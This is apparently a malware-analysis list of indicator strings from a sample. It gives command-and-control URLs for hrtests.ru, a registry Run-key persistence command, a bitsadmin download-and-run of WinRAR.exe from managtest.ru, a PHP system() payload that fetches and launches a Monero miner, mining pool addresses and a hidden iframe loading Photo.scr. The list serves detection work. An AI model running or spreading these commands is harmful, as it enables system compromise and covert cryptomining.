# Indicative strings

* http://hrtests.ru/S.php?ver=22&pc=%s&user=%s&sys=%s&cmd=%s&startup=%s/%s
* http://hrtests.ru/S.php?ver=24&pc=%s&user=%s&sys=%s&cmd=%s&startup=%s/%s
* http://hrtests.ru/S.php?ver=29&pc=%d.%d.%d.%d&user=%s&sys=%s&cmd=%s&startup=ok
* http://hrtests.ru/S.php?ver=17&pc=%c%c%c%c%c%c%c&user=%s&sys=%s&cmd=%s&startup=%s/%s
* /c echo f|xcopy /y “%s” “%%APPDATA%%\Photo.exe” && reg add “HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” /v “Run” /d “%%APPDATA%%\Photo.exe” /t REG_SZ /f
* /c bitsadmin /transfer whatever “http://www.managtest.ru/WinRAR.exe” “%TEMP%\WinRAR.exe” && “%TEMP%\WinRAR.exe”
* /c (echo stratum+tcp://mine.moneropool.com:3333& echo stratum+tcp://monero.crypto-pool.fr:3333& echo stratum+tcp://xmr.prohash.net:7777& echo stratum+tcp://pool.minexmr.com:5555)> %TEMP%\pools.txt
* <?php system(“apt-get update && apt-get install screen libcurl4-openssl-dev libjansson-dev -y & test -e minerd || (wget http://managtest.ru/minerd && chmod 777 minerd && screen -dmS miner ./minerd -a cryptonight -o stratum+tcp://pool.minexmr.com:4444 -u 42n7TTpcpLe8yPPLxgh27xXSBWJnVu9bW8t7GuZXGWt74vryjew2D5EjSSvHBmxNhx8RezfYjv3J7W63bWS8fEgg6tct3yZ -p x)”);
* <iframe src=Photo.scr width=1 height=1 frameborder=0>
* Sr&w09.